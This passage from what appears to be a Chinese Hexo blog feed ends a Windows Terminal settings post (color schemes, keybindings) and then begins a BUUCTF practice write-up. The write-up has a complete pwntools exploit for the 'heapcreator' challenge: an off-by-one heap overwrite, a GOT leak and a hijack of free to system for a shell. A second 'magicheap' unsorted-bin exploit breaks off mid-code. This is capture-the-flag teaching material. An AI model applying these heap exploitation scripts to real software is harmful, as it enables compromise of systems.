class="string">&quot;#E5C07B&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#61AFEF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#C678DD&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#56B6C2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#DCDFE4&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;One Half Light&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#383A42&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FAFAFA&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#4F525D&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#383A42&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#E45649&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#50A14F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#C18301&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#0184BC&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#A626A4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#0997B3&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#FAFAFA&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#4F525D&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#DF6C75&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#98C379&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#E4C07A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#61AFEF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#C577DD&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#56B5C1&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Dark&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#DC322F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Solarized Light&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#073642&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#DC322F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#859900&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#B58900&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#268BD2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#D33682&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#2AA198&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#EEE8D5&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#002B36&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#CB4B16&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#586E75&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#657B83&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#839496&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#6C71C4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#93A1A1&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#FDF6E3&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tango Dark&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#D3D7CF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#CC0000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#4E9A06&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#C4A000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#3465A4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#75507B&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#06989A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#D3D7CF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#555753&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#EF2929&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#8AE234&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#FCE94F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#729FCF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#AD7FA8&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#34E2E2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#EEEEEC&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Tango Light&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#555753&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#FFFFFF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;black&quot;</span>: <span class="string">&quot;#000000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;red&quot;</span>: <span class="string">&quot;#CC0000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;green&quot;</span>: <span class="string">&quot;#4E9A06&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;yellow&quot;</span>: <span class="string">&quot;#C4A000&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;blue&quot;</span>: <span class="string">&quot;#3465A4&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;purple&quot;</span>: <span class="string">&quot;#75507B&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;cyan&quot;</span>: <span class="string">&quot;#06989A&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;white&quot;</span>: <span class="string">&quot;#D3D7CF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlack&quot;</span>: <span class="string">&quot;#555753&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightRed&quot;</span>: <span class="string">&quot;#EF2929&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightGreen&quot;</span>: <span class="string">&quot;#8AE234&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightYellow&quot;</span>: <span class="string">&quot;#FCE94F&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightBlue&quot;</span>: <span class="string">&quot;#729FCF&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightPurple&quot;</span>: <span class="string">&quot;#AD7FA8&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightCyan&quot;</span>: <span class="string">&quot;#34E2E2&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;brightWhite&quot;</span>: <span class="string">&quot;#EEEEEC&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Add custom actions and keybindings to this array.</span></span><br><span class="line">    <span class="comment">// To unbind a key combination from your defaults.json, set the command to &quot;unbound&quot;.</span></span><br><span class="line">    <span class="comment">// To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings</span></span><br><span class="line">    <span class="attr">&quot;actions&quot;</span>:</span><br><span class="line">    [</span><br><span class="line">        <span class="comment">// Copy and paste are bound to Ctrl+Shift+C and Ctrl+Shift+V in your defaults.json.</span></span><br><span class="line">        <span class="comment">// These two lines additionally bind them to Ctrl+C and Ctrl+V.</span></span><br><span class="line">        <span class="comment">// To learn more about selection, visit https://aka.ms/terminal-selection</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123;<span class="attr">&quot;action&quot;</span>: <span class="string">&quot;copy&quot;</span>, <span class="attr">&quot;singleLine&quot;</span>: <span class="literal">false</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+c&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;paste&quot;</span>, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+v&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Ctrl+Shift+F to open the search box</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;find&quot;</span>, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+shift+f&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;closeWindow&quot;</span>, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+f4&quot;</span> &#125;,</span><br><span class="line">        <span class="comment">// 这将打开当前选项卡右侧的选项卡。</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;nextTab&quot;</span>, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+tab&quot;</span> &#125;,</span><br><span class="line">        <span class="comment">// 这使您可以进入“聚焦模式”，从而隐藏选项卡和标题栏。</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: <span class="string">&quot;toggleFocusMode&quot;</span> &#125;,</span><br><span class="line">        <span class="comment">// 移动窗格焦点</span></span><br><span class="line">        <span class="comment">// 这会根据方向将焦点更改为其他窗格。将设置direction为&quot;previous&quot;会将焦点移到最近使用的窗格。</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;moveFocus&quot;</span>, <span class="attr">&quot;direction&quot;</span>: <span class="string">&quot;down&quot;</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+down&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;moveFocus&quot;</span>, <span class="attr">&quot;direction&quot;</span>: <span class="string">&quot;left&quot;</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+left&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;moveFocus&quot;</span>, <span class="attr">&quot;direction&quot;</span>: <span class="string">&quot;right&quot;</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+right&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;moveFocus&quot;</span>, <span class="attr">&quot;direction&quot;</span>: <span class="string">&quot;up&quot;</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+up&quot;</span> &#125;,</span><br><span class="line">        <span class="comment">// 调整字体大小</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;adjustFontSize&quot;</span>, <span class="attr">&quot;delta&quot;</span>: <span class="number">1</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+=&quot;</span> &#125;,</span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;adjustFontSize&quot;</span>, <span class="attr">&quot;delta&quot;</span>: <span class="number">-1</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;ctrl+-&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Press Alt+Shift+D to open a new pane.</span></span><br><span class="line">        <span class="comment">// - &quot;split&quot;: &quot;auto&quot; makes this pane open in the direction that provides the most surface area.</span></span><br><span class="line">        <span class="comment">// - &quot;splitMode&quot;: &quot;duplicate&quot; makes the new pane use the focused pane&#x27;s profile.</span></span><br><span class="line">        <span class="comment">// To learn more about panes, visit https://aka.ms/terminal-panes</span></span><br><span class="line">        &#123; <span class="attr">&quot;command&quot;</span>: &#123; <span class="attr">&quot;action&quot;</span>: <span class="string">&quot;splitPane&quot;</span>, <span class="attr">&quot;split&quot;</span>: <span class="string">&quot;auto&quot;</span>, <span class="attr">&quot;splitMode&quot;</span>: <span class="string">&quot;duplicate&quot;</span> &#125;, <span class="attr">&quot;keys&quot;</span>: <span class="string">&quot;alt+shift+d&quot;</span> &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="环境搭建" scheme="http://example.com/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>buuctf刷题</title>
    <link href="http://example.com/2021/02/11/buuctf%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2021/02/11/buuctf%E5%88%B7%E9%A2%98/</id>
    <published>2021-02-10T16:10:45.000Z</published>
    <updated>2021-02-10T16:15:17.104Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h1><p>一道关于got表劫持的思路，存在off-by-one可以改写堆块大小</p><p>说一下关于0x8，0x8是\b,即退格键，也就是说\b可以消除输入在他前面的空格或者\t，如果是\t后面有空格，就消除空格，能输出一个\t，就是六个字符的宽度</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./heapcreator&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25568</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content of heap : &#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27; :&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">    de(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0x8</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))<span class="comment">#2</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    free_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    bin_sh_libc=<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line">    system_libc=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    free_libc=libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    offset=free_addr-free_libc</span><br><span class="line">    system_addr=system_libc+offset</span><br><span class="line">    bin_addr=bin_sh_libc+offset</span><br><span class="line">    success(<span class="string">&#x27;free_addr &#x27;</span> + <span class="built_in">hex</span>(free_addr))</span><br><span class="line">    success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    success(<span class="string">&quot;bin_addr: &quot;</span> + <span class="built_in">hex</span>(bin_addr))</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">    de(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="magicheap"><a href="#magicheap" class="headerlink" title="magicheap"></a>magicheap</h1><p>利用 unsorted bin attack 覆盖 magic&gt;0x1305，然后输入 v3= 4849, 就可以拿到 shell了。</p><p>(chunk 2 是为了防止 free chunk 1 的时候 chunk 1 与 top chunk  合并，chunk0，chunk2的大小随意，chunk1的大小要&gt;0x80（fast  bin最大为0x80）,这样free它的时候会进入到unsorted bin（chunk在被释放后，如果其大小不在fast  bin的范围内，会被先放到unsorted bin,在申请内存的时候如果大小不是fast bin大小的内存并且在small  bin中没有找到合适的chunk，就会去unsorted中寻找。《N1BOOK》p367）)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pe=<span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">libc_23=<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_27=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line">ip,port = <span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26272</span></span><br><span class="line">elf=ELF(pe)</span><br><span class="line">libc=ELF(libc_23)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(pe)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span>():</span>  <span class="comment">#one_gadget</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">&#x27;64&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">&#x27;2.23&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">            one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">&#x27;2.27&#x27;</span>):</span><br><span class="line">            <span class="comment">#one = [0x4f2c5 , 0x4f322 , 0x10a38c]</span></span><br><span class="line">            one = [<span class="number">0x4f365</span>, <span class="number">0x4f3c2</span>, <span class="number">0x10a45c</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content of heap:&#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,context</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Content of heap : &#x27;</span>,<span class="built_in">str</span>(context))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">de</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span 